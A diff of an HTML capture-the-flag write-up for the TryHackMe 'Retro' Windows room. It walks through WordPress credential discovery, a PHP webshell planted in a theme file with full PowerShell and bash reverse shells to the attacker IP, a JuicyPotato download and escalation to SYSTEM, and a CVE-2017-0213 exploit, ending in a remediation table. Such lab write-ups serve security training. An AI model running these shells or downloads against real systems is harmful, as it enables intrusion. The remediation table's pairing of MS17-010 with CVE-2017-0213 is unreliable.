@@ -1,153 +1,298 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Retro — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Retro — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty hard-badge">Hard</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Retro</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">
-        Windows Server 2016 · WordPress Credential Harvesting → Theme Editor RCE → JuicyPotato SYSTEM
-      </p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Windows Server 2016 (Build 14393)</span></div>
-        <div class="meta-item">🎯 Target: <span>10.49.187.4</span></div>
-        <div class="meta-item">🔑 Vector: <span>WordPress → RCE → Token Impersonation</span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-hard">Hard</span>
+        <span class="badge badge-os">Windows</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="retro-tryhackme-writeup">Retro - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Retro</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Windows Server 2016 Standard (Build 14393)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.49.187.4</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Hard</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">WordPress Credential Harvesting, WordPress Theme Editor RCE (<code>404.php</code>), Token Impersonation Privilege Escalation via <strong>JuicyPotato</strong> (<code>SeImpersonatePrivilege</code>), Alternative Path: FreeRDP + <strong>CVE-2017-0213</strong> (Windows COM Elevation)</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191414.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<ol>
+<li><strong>Reconnaissance &amp; Credential Discovery</strong>:<br />
+   - Enumerated web service on Port 80 and identified WordPress site under <code>/retro/</code>.<br />
+   - Found a comment posted by user <code>wade</code> disclosing his password (<code>********</code>).</li>
+<li><strong>Initial Foothold (WordPress Theme Editor RCE)</strong>:<br />
+   - Logged into WordPress admin (<code>/retro/wp-admin/</code>) using <code>wade</code> : <code>********</code>.<br />
+   - Navigated to <strong>Appearance &gt; Theme Editor</strong>, modified <code>404.php</code> of the <code>90s-retro</code> theme to inject a PHP reverse shell with Windows PowerShell payload.<br />
+   - Triggered the payload via <code>http://10.49.187.4/retro/wp-content/themes/90s-retro/404.php?os=windows</code>.<br />
+   - Caught a reverse shell on listener (<code>penelope nc -p 4444</code>) as <strong><code>nt authority\iusr</code></strong>.</li>
+<li><strong>Privilege Escalation to SYSTEM (JuicyPotato)</strong>:<br />
+   - Checked privileges with <code>whoami /priv</code> and verified <strong><code>SeImpersonatePrivilege</code></strong> is Enabled.<br />
+   - Uploaded <code>JuicyPotato.exe</code> from attacker machine via <code>Invoke-WebRequest</code>.<br />
+   - Generated reverse shell payload <code>payload.exe</code> with <code>msfvenom</code> listening on port 4445.<br />
+   - Executed <code>JuicyPotato.exe</code> targeting CLSID <code>{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</code> to spawn <code>payload.exe</code>.<br />
+   - Caught elevated reverse shell on port 4445 as <strong><code>nt authority\system</code></strong>.<br />
+   - Read root flag: <code>type C:\Users\Administrator\Desktop\root.txt.txt</code> ➔ <code>********************************</code>.</li>
+<li><strong>Alternative Path (FreeRDP &amp; CVE-2017-0213)</strong>:<br />
+   - Connected via <strong>FreeRDP</strong> to <code>10.49.187.4</code> as <code>wade:********</code> and retrieved <code>user.txt</code> (<code>********************************</code>) from the desktop.<br />
+   - Downloaded <code>CVE-2017-0213_x64.zip</code> from attacker machine (<code>http://192.168.132.94:8000/</code>).<br />
+   - Extracted and executed <code>CVE-2017-0213_x64.exe</code> to spawn an elevated Administrator command prompt.<br />
+   - Read root flag from <code>C:\Users\Administrator\Desktop\root.txt.txt</code>.</li>
+</ol>
+<hr />
+<h2 id="2-phase-1-reconnaissance-web-enumeration">2. Phase 1: Reconnaissance &amp; Web Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>Scanning target <code>10.49.187.4</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111150319.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111150325.png" /></p>
+<ul>
+<li><strong>Port 80/tcp</strong>: Microsoft IIS httpd 10.0</li>
+<li><strong>Port 3389/tcp</strong>: Microsoft Terminal Services (RDP)</li>
+</ul>
+<h3 id="22-wordpress-directory-comment-enumeration">2.2 WordPress Directory &amp; Comment Enumeration</h3>
+<p>Browsing to <code>http://10.49.187.4/retro/</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111150412.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111150457.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111150506.png" /></p>
+<p>Reading blog posts and comments:</p>
+<p>In the comments, user <code>wade</code> mentions leaving his password as his avatar name:<br />
+- <strong>Username</strong>: <code>wade</code><br />
+- <strong>Password</strong>: <code>********</code></p>
+<hr />
+<h2 id="3-phase-2-initial-foothold-wordpress-theme-editor-rce">3. Phase 2: Initial Foothold (WordPress Theme Editor RCE)</h2>
+<h3 id="31-logging-into-wordpress-admin-editing-404php">3.1 Logging into WordPress Admin &amp; Editing 404.php</h3>
+<p>We log in to <code>http://10.49.187.4/retro/wp-login.php</code> as <code>wade:********</code>.<br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111150527.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111150555.png" />We navigate to <strong>Appearance &gt; Theme Editor</strong>, select theme <strong>90s Retro</strong>, and edit <code>404.php</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111152744.png" /></p>
+<p><strong>Injected Reverse Shell Code in <code>404.php</code>:</strong></p>
+<pre><code class="language-php">&lt;?php
+$ip = '192.168.132.94'; // Attacker IP
+$port = 4444;           // Listener Port
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Retro</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Windows Server 2016 Standard (Build 14393)</td></tr>
-      <tr><th>Target IP</th><td><code>10.49.187.4</code></td></tr>
-      <tr><th>Attacker IP</th><td><code>192.168.132.94</code></td></tr>
-      <tr><th>Difficulty</th><td>Hard</td></tr>
-      <tr><th>Key CVEs / Techniques</th><td>WordPress Theme Editor RCE, SeImpersonatePrivilege, JuicyPotato, CVE-2017-0213</td></tr>
-    </table>
+$os = isset($_GET['os']) ? $_GET['os'] : '';
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 80 (IIS / WordPress /retro/) · Port 3389 (RDP)
-  → Wade's blog comment discloses password
-  → WP Admin login (wade : ████████)
-  → Appearance › Theme Editor › 90s-retro/404.php → PHP reverse shell
-  → Trigger: /retro/wp-content/themes/90s-retro/404.php?os=windows
-  → Shell as nt authority\iusr
-  → whoami /priv → SeImpersonatePrivilege Enabled
-  → Transfer JuicyPotato.exe + msfvenom payload.exe
-  → JuicyPotato CLSID {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
-  → Shell as nt authority\system
-  → type C:\Users\Administrator\Desktop\root.txt.txt → ████████████████
-
-[Alternative Path]
-  → xfreerdp as wade → user.txt on Desktop
-  → Download CVE-2017-0213_x64.exe via Chrome
-  → Execute → Elevated cmd → root.txt.txt → ████████████████</div>
-
-    <h2>// Phase 1 — Reconnaissance</h2>
-
-    <h3>1.1 Nmap Scan</h3>
-    <pre><code class="cmd">nmap -sV -sC 10.49.187.4 -Pn</code></pre>
-    <p>Open ports: <code>80/tcp</code> Microsoft IIS 10.0 · <code>3389/tcp</code> Microsoft Terminal Services (RDP)</p>
-
-    <h3>1.2 WordPress Comment — Credential Disclosure</h3>
-    <p>Browsing <code>http://10.49.187.4/retro/</code>, user <strong>wade</strong> posted a comment revealing his password is his avatar name.</p>
-    <ul style="color:#888;font-size:13px;margin:10px 0 10px 20px;line-height:2">
-      <li>Username: <code>wade</code></li>
-      <li>Password: <code class="redacted">████████</code></li>
-    </ul>
-
-    <h2>// Phase 2 — Initial Foothold (WordPress Theme Editor RCE)</h2>
-    <p>Logged into <code>/retro/wp-login.php</code> with <code>wade:████████</code>. Navigated to <strong>Appearance › Theme Editor</strong>, selected <strong>90s Retro</strong> theme, edited <code>404.php</code>.</p>
-
-    <h3>2.1 Injected PHP Reverse Shell (404.php)</h3>
-    <pre><code>&lt;?php
-$ip   = '192.168.132.94';
-$port = 4444;
-$os   = isset($_GET['os']) ? $_GET['os'] : '';
 if ($os === 'windows') {
-    $cmd = "powershell -NoP -NonI -W Hidden -Command ...";
+    $cmd = &quot;powershell -NoP -NonI -W Hidden -Command \&quot;\$client = New-Object System.Net.Sockets.TCPClient('$ip', $port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i);\$sendback = (iex \$data 2&gt;&amp;1 | Out-String);\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '&gt; ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte, 0, \$sendbyte.Length);\$stream.Flush()}\&quot;&quot;;
     system($cmd);
+} elseif ($os === 'linux') {
+    $cmd = &quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1'&quot;;
+    system($cmd);
+} else {
+    echo &quot;Specify ?os=windows or ?os=linux&quot;;
 }
-?&gt;</code></pre>
+?&gt;
+</code></pre>
+<h3 id="32-triggering-reverse-shell">3.2 Triggering Reverse Shell</h3>
+<p>We start our listener:</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111150738.png" /><br />
+We trigger the payload in the browser:</p>
+<pre><code class="language-text">http://10.49.187.4/retro/wp-content/themes/90s-retro/404.php?os=windows
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111152904.png" /></p>
+<p>We receive a reverse shell session as <strong><code>nt authority\iusr</code></strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111152914.png" /></p>
+<pre><code class="language-text">[New Reverse Shell] =&gt; RETROWEB 10.49.187.4 Microsoft_Windows_Server_2016_Standard-x64-based_PC  nt authority\iusr
+PS C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro&gt;
+</code></pre>
+<hr />
+<h2 id="4-phase-3-privilege-escalation-via-juicypotato">4. Phase 3: Privilege Escalation via JuicyPotato</h2>
+<h3 id="41-checking-token-privileges">4.1 Checking Token Privileges</h3>
+<p>We inspect privileges with <code>whoami /priv</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111152931.png" /></p>
+<pre><code class="language-powershell">PS C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro&gt; whoami /priv
 
-    <h3>2.2 Triggering Shell</h3>
-    <pre><code class="cmd">penelope nc -p 4444</code></pre>
-    <pre><code>http://10.49.187.4/retro/wp-content/themes/90s-retro/404.php?os=windows</code></pre>
-    <p>Reverse shell received as <strong>nt authority\iusr</strong>.</p>
-
-    <h2>// Phase 3 — Privilege Escalation (JuicyPotato)</h2>
-
-    <h3>3.1 Token Privileges</h3>
-    <pre><code class="cmd">whoami /priv</code></pre>
-    <p><code>SeImpersonatePrivilege</code> → <strong>Enabled</strong>. Vulnerable to token impersonation attacks.</p>
-
-    <h3>3.2 JuicyPotato Exploit</h3>
-    <pre><code class="cmd">Invoke-WebRequest -Uri "http://192.168.132.94:8000/JuicyPotato.exe" -o .\JuicyPotato.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4445 -f exe -o payload.exe
-.\JuicyPotato.exe -l 4445 -p payload.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"</code></pre>
-    <pre><code>[+] authresult 0
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+</code></pre>
+<p><code>SeImpersonatePrivilege</code> is enabled, making the service account vulnerable to <strong>JuicyPotato</strong> token impersonation.</p>
+<h3 id="42-downloading-juicypotato">4.2 Downloading JuicyPotato</h3>
+<p>We host <code>JuicyPotato.exe</code> on our Python web server (<code>http://192.168.132.94:8000/JuicyPotato.exe</code>) and download it onto the target:</p>
+<pre><code class="language-powershell">Invoke-WebRequest -Uri &quot;http://192.168.132.94:8000/JuicyPotato.exe&quot; -o C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro\JuicyPotato.exe
+dir
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111162908.png" /></p>
+<h3 id="43-generating-payload-starting-listener">4.3 Generating Payload &amp; Starting Listener</h3>
+<p>On our Kali machine, we generate a Windows reverse shell executable on port 4445:</p>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4445 -f exe -o payload.exe
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111163959.png" /></p>
+<p>We transfer <code>payload.exe</code> to the target and start a listener on port 4445:</p>
+<pre><code class="language-bash">penelope nc -p 4445
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111164053.png" /></p>
+<h3 id="44-triggering-juicypotato-obtaining-system">4.4 Triggering JuicyPotato &amp; Obtaining SYSTEM</h3>
+<p>We run <code>JuicyPotato.exe</code> targeting CLSID <code>{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</code>:</p>
+<pre><code class="language-powershell">.\JuicyPotato.exe -l 4445 -p payload.exe -t * -c &quot;{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}&quot;
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111164116.png" /></p>
+<pre><code class="language-text">[+] authresult 0
 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
-[+] CreateProcessWithTokenW OK</code></pre>
-
-    <h3>3.3 Root Flag</h3>
-    <pre><code class="cmd">type C:\Users\Administrator\Desktop\root.txt.txt</code></pre>
-    <p>Root Flag: <code class="redacted">████████████████████████████████</code></p>
-    <p>User Flag: <code class="redacted">████████████████████████████████</code></p>
-
-    <h2>// Alternative Path — FreeRDP + CVE-2017-0213</h2>
-    <pre><code class="cmd">xfreerdp /v:10.49.187.4 /u:wade /p:████████</code></pre>
-    <p>Downloaded <code>CVE-2017-0213_x64.zip</code> via Chrome from attacker HTTP server. Extracted and ran <code>CVE-2017-0213_x64.exe</code> → spawned elevated Administrator cmd.exe.</p>
-
-    <h2>// Remediation</h2>
-    <table class="info-table">
-      <tr><th>Vulnerability</th><th>Recommended Fix</th></tr>
-      <tr><td>Cleartext password in WordPress comment</td><td>Audit public posts; enforce credential hygiene policies</td></tr>
-      <tr><td>Theme Editor enabled</td><td>Set <code>define('DISALLOW_FILE_EDIT', true);</code> in wp-config.php</td></tr>
-      <tr><td>SeImpersonatePrivilege on IIS account</td><td>Restrict service account privileges; apply KB4487044 / KB4487038</td></tr>
-      <tr><td>CVE-2017-0213</td><td>Apply MS17 cumulative security updates on Windows Server 2016</td></tr>
-    </table>
-
-  </article>
-
-  <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
+[+] CreateProcessWithTokenW OK
+</code></pre>
+<p>We catch the reverse shell on port 4445 as <strong><code>nt authority\system</code></strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111164133.png" /></p>
+<pre><code class="language-cmd">C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
+<h3 id="45-retrieving-root-flag">4.5 Retrieving Root Flag</h3>
+<p>We read the root flag located at <code>C:\Users\Administrator\Desktop\root.txt.txt</code>:</p>
+<pre><code class="language-cmd">C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111164207.png" /></p>
+<ul>
+<li><strong>Root Flag</strong>: <code>********************************</code></li>
+</ul>
+<hr />
+<h2 id="5-alternative-path-freerdp-cve-2017-0213">5. Alternative Path: FreeRDP &amp; CVE-2017-0213</h2>
+<p>An alternative exploitation route utilizes direct Remote Desktop (RDP) access using Wade's credentials:</p>
+<h3 id="51-connecting-via-freerdp-user-flag">5.1 Connecting via FreeRDP &amp; User Flag</h3>
+<p>We connect to <code>10.49.187.4</code> using FreeRDP:</p>
+<pre><code class="language-bash">xfreerdp /v:10.49.187.4 /u:wade /p:********
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111154631.png" /></p>
+<p>On Wade's desktop, <code>user.txt</code> is retrieved (<code>********************************</code>):</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111161637.png" /></p>
+<p>System information verifies <strong>Windows Server 2016 Standard, Version 1607, OS Build 14393.0</strong>.</p>
+<h3 id="52-downloading-running-cve-2017-0213-exploit">5.2 Downloading &amp; Running CVE-2017-0213 Exploit</h3>
+<p>We host <code>CVE-2017-0213_x64.zip</code> on our attacker HTTP server:</p>
+<pre><code class="language-bash">python3 -m http.server 8000
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111161754.png" /></p>
+<p>Inside the FreeRDP session, we open Google Chrome and download <code>http://192.168.132.94:8000/CVE-2017-0213_x64.zip</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111161829.png" /></p>
+<p>We extract the zip file to find <code>CVE-2017-0213_x64.exe</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111161904.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111161923.png" /></p>
+<p>We execute <code>CVE-2017-0213_x64.exe</code>, which exploits the Windows COM Elevation of Privilege vulnerability and immediately spawns an elevated command prompt (<code>Administrator: C:\Windows\system32\cmd.exe</code>):</p>
+<pre><code class="language-cmd">C:\Users\Administrator\Desktop&gt;type root.txt.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111162013.png" /></p>
+<ul>
+<li><strong>Root Flag Confirmed via Alternative Path!</strong> (<code>********************************</code>)</li>
+</ul>
+<hr />
+<h2 id="6-security-mitigations-remediation">6. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Cleartext Password in Blog Comment</strong></td>
+<td style="text-align: left;">Immediate compromise of WordPress admin account and RDP access.</td>
+<td style="text-align: left;">Audit public blog posts and comments to prevent credential exposure.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>WordPress Theme Editor Enabled</strong></td>
+<td style="text-align: left;">Allows arbitrary PHP execution on the server.</td>
+<td style="text-align: left;">Disable theme and plugin file editing by setting <code>define('DISALLOW_FILE_EDIT', true);</code> in <code>wp-config.php</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Token Impersonation (<code>SeImpersonatePrivilege</code>)</strong></td>
+<td style="text-align: left;">Local Privilege Escalation to <code>NT AUTHORITY\SYSTEM</code> via JuicyPotato.</td>
+<td style="text-align: left;">Restrict service account privileges or migrate to DCOM hardened updates (KB4487044 / KB4487038).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CVE-2017-0213 (Windows COM Elevation)</strong></td>
+<td style="text-align: left;">Allows local standard user to elevate to Administrator.</td>
+<td style="text-align: left;">Apply Microsoft Security Update MS17-010 / KB4013087 and cumulative security updates on Windows Server 2016.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-tools-used">7. Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong>: Port and service enumeration</li>
+<li><strong>Penelope / Netcat</strong>: Reverse shell listener handling</li>
+<li><strong>JuicyPotato</strong>: Abusing <code>SeImpersonatePrivilege</code> for local SYSTEM escalation</li>
+<li><strong>msfvenom</strong>: Windows reverse shell binary payload generation</li>
+<li><strong>FreeRDP</strong>: Remote Desktop client</li>
+<li><strong>CVE-2017-0213_x64</strong>: Windows COM Elevation exploit</li>
+</ul>
     </div>
-  </footer>
+  </main>
 
+  <!-- FOOTER -->
+  <footer class="footer">
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
+  </footer>
 </body>
 </html>
